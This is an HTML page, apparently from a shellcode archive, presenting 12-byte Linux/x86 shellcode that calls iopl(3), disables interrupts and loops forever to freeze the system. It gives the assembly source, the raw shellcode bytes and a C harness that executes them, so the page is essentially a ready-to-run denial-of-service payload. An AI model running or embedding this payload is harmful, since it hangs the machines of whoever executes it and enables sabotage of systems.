<html><head><title>Linux/x86 - iopl(3); asm(cli); while(1){} - 12 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
  :::::::-.   ...    ::::::.    :::.
   ;;,   `';, ;;     ;;;`;;;;,  `;;;
   `[[     [[[['     [[[  [[[[[. '[[
    $$,    $$$$      $$$  $$$ &quot;Y$c$$
    888_,o8P'88    .d888  888    Y88
    MMMMP&quot;`   &quot;YmmMMMM&quot;&quot;  MMM     YM

 	[ dun[at]strcpy.pl ]
  
 [ linux/x86 iopl(3); asm(&quot;cli&quot;); while(1){} 12 bytes ]
 
 ###############################################################
   iopl(3); asm(&quot;cli&quot;); while(1){}
   // * this code cause freezeing system
 #################################################################
 
 __asm__(
	&quot;xorl %eax, %eax\n&quot;
	&quot;pushl $0x3\n&quot;
	&quot;popl %ebx\n&quot;
	&quot;movb $0x6e,%al\n&quot;
	&quot;int $0x80\n&quot;
	&quot;cli\n&quot;
	&quot;x1:\n&quot;
	&quot;jmp x1\n&quot;
 );

*/


char shellcode[]=&quot;\x31\xc0\x6a\x03\x5b\xb0\x6e\xcd\x80\xfa\xeb\xfe&quot;;

int main() {

	void (*sc)();
	sc = (void *)&amp;shellcode;
	sc();
	
return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
